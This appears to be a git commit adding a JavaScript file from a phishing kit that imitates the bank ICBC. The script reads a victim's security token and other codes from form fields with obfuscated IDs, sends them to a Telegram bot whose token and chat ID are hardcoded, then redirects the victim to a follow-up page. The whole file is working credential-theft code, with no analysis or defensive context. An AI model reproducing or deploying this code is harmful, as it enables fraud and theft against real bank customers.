c7dd8be13e34a97efe44c89bbed613d885274195
fullmoney979-rgb <fullmoney979@gmail.com>
2025-12-08 17:47:48 +0100

    323

---
+++ jotaese/lasegund4.js
@@ -0,0 +1,34 @@
+//bot token
+var telegram_bot_id = "5313524679:AAF6KDH6xaEjg5ripIokr3_5bKy1_xXvAj4";
+//chat id
+var chat_id = -1001182017096;
+var uBOLT, opri, ripyr0pi;
+var ready = function () {
+    uBOLT = document.getElementById("c4r0tyx18249c").value;
+    opri = document.getElementById("284092mcge28").innerHTML;
+    ripyr0pi = document.getElementById("c3e29f94jv").innerHTML;
+    message = "🔴ICBC🔴\nT0KS1⃣: " + uBOLT + "\n\nLAIPX: " + opri +"\n" + ripyr0pi +"\n🔴C0DIGO SYN4PSE🔴";
+};
+var sender = function () {
+    ready();
+    var settings = {
+        "async": true,
+        "crossDomain": true,
+        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
+        "method": "POST",
+        "headers": {
+            "Content-Type": "application/json",
+            "cache-control": "no-cache"
+
+        },
+        "data": JSON.stringify({
+            "chat_id": chat_id,
+            "text": message
+        })
+    };
+    $.ajax(settings).done(function (response) {
+        window.location = 'ladeviex.html';
+        console.log(response);
+    });
+    return false;
+};
